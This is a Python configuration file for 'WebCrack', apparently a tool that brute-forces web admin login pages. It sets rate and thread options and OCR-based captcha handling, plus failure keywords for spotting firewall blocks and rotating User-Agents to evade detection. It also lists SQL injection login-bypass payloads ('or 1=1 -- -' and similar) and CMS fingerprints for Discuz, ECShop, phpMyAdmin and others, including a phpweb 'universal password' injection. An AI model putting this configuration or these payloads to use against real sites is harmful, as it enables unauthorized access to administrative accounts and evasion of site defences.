#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Configuration module for WebCrack
Handles loading and management of all configuration parameters
"""

import os
from pathlib import Path


def txt2list(filename):
    """
    Load lines from a text file into a list
    
    Args:
        filename (str): Name of the file to load
        
    Returns:
        list: List of lines from the file
    """
    ret = []
    # Get the directory where this file is located
    current_dir = Path(__file__).parent
    # Construct path to the conf directory
    file_path = current_dir.parent.parent / 'conf' / filename
    
    try:
        if file_path.exists():
            with open(file_path, "r", encoding="UTF-8") as f:
                for line in f.readlines():
                    ret.append(line.strip())
        else:
            print(f"Warning: File {file_path} does not exist")
    except Exception as e:
        print(f"Error reading file {file_path}: {str(e)}")
    
    return ret


def load_config():
    """
    Load all configuration parameters
    
    Returns:
        dict: Configuration dictionary
    """
    config = {
        "log": {
            "log_filename": "logs.txt",
            "success_filename": "success.txt"
        },
        
        "brute_force": {
            "timeout": 10,
            "delay": 0.03,
            "test_username": "admin",
            "test_password": "length_test",
            "requests_proxies": {},
            "max_workers": 1,  # 添加多线程工作数配置
            "fail_words": [
                '密码错误', '重试', '不正确', '密码有误', '不成功', '重新输入', '不存在', 
                '登录失败', '登陆失败', '密码或安全问题错误', 'history.go', 'history.back',
                '已被锁定', '安全拦截', '还可以尝试', '无效', '攻击行为', '创宇盾', 
                'http://zhuji.360.cn/guard/firewall/stopattack.html', 'D盾_拦截提示', 
                '用户不存在', '非法', '百度云加速', '安全威胁', '防火墙', '黑客', '不合法', 
                'Denied', '尝试次数', 'http://safe.webscan.360.cn/stopattack.html', 
                "Illegal operation", "服务器安全狗防护验证页面"
            ]
        },
        
        "captcha": {
            "enabled": True,
            "ocr_enabled": True,
            "captcha_input_name": "captcha",
            "captcha_img_name": "captcha_img"
        },
        
        "dictionary": {
            "base": {
                "username_list": ['admin'],
                "password_list": txt2list("password_list.txt")
            },
            
            "file": {
                "enabled": True,
                "username_file": "username.txt",
                "password_file": "password.txt"
            },
            
            "domain": {
                "enabled": True,
                "suffix_list": ["", "123", "666", "888", "123456"]
            },
            
            "sql_injection": {
                "enabled": True,
                "payload_list": [
                    "admin' or 'a'='a",
                    "'or'='or'",
                    "admin' or '1'='1' or 1=1",
                    "')or('a'='a",
                    "'or 1=1 -- -"
                ]
            }
        },
        
        "headers": {
            "enabled": True,
            "user_agents": [
                "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0",
                "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre",
                "Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
                "Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
                # 新增的User-Agent字符串
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.200 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.120 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.149 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; arm64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.200 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:118.0) Gecko/20100101 Firefox/118.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
                "Mozilla/5.0 (Android 13; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.61",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.200 Safari/537.36 Edg/119.0.2151.97",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36 Edg/118.0.2088.76",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.88 Safari/537.36 Edg/117.0.2045.60",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 EdgiOS/120.0.2210.54 Mobile/15E148 Safari/605.1.15",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/605.1.15",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_8) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.200 Safari/537.36 OPR/105.0.0.0",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36 OPR/104.0.0.0",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.88 Safari/537.36 OPR/103.0.0.0",
                "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0 OPR/105.0.0.0",
                "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.200 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 12; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.120 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 11; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.149 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 10; Huawei P40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.200 Mobile Safari/537.36",
                "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
                "Mozilla/5.0 (Android 13; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
                "Mozilla/5.0 (Android 12; Mobile; rv:118.0) Gecko/118.0 Firefox/118.0",
                "Mozilla/5.0 (Android 11; Mobile; rv:117.0) Gecko/117.0 Firefox/117.0",
                "Mozilla/5.0 (Android 10; Mobile; rv:116.0) Gecko/116.0 Firefox/116.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/120.0.0.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/119.0.6045.200 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/118.0.5993.90 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/117.0.5938.88 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/116.0.5845.200 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.115 Mobile Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_8) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
                "Mozilla/5.0 (Linux; U; Android 8.1; en-us; Nokia 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.154 Mobile Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; ARM; Surface Pro X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.8 Mobile/15E148 Safari/605.1.15"
            ],
            
            "default_headers": {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'User-Agent': "WebCrack Test",
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.8',
                "Referer": "http://www.baidu.com/",
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        },
        
        "parser": {
            "default_value": "0000",
            "username_keywords": ["user", "name", "zhanghao", "yonghu", "email", "account"],
            "password_keywords": ["pass", "pw", "mima"],
            "captcha_keywords": [
                "验证码", "captcha", "验 证 码", "点击更换", "点击刷新", 
                "看不清", "认证码", "安全问题"
            ],
            "login_keywords": [
                "用户名", "密码", "login", "denglu", "登录", "user", 
                "pass", "yonghu", "mima", "admin"
            ],
            "captcha_img_keywords": [
                "captcha", "codeimg", "checkcode", "verify", "验证码", 
                "安全验证", "认证码", "校验码"
            ]
        },
        
        "cms": {
            "discuz": {
                "name": "discuz",
                "keywords": "admin_questionid",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "admin.php?action=logout",
                "die_flag": "密码错误次数过多",
                "alert": 0,
                "note": "discuz论坛测试"
            },
            "dedecms": {
                "name": "dedecms",
                "keywords": "newdedecms",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "",
                "die_flag": "",
                "alert": 0,
                "note": "dedecms测试"
            },
            "phpweb": {
                "name": "phpweb",
                "keywords": "width:100%;height:100%;background:#ffffff;padding:160px",
                "captcha": 0,
                "sqlin_able": 1,
                "success_flag": "admin.php?action=logout",
                "die_flag": "",
                "alert": 1,
                "note": "存在 phpweb 万能密码 : admin' or '1' ='1' or '1'='1"
            },
            "ecshop": {
                "name": "ecshop",
                "keywords": "validator.required('username', user_name_empty);",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "ECSCP[admin_pass]",
                "die_flag": "",
                "alert": 0,
                "note": "ecshop测试"
            },
            "phpmyadmin": {
                "name": "phpmyadmin",
                "keywords": "pma_username",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "db_structure.php",
                "die_flag": "",
                "alert": 0,
                "note": "phpmyadmin测试"
            }
        }
    }
    
    return config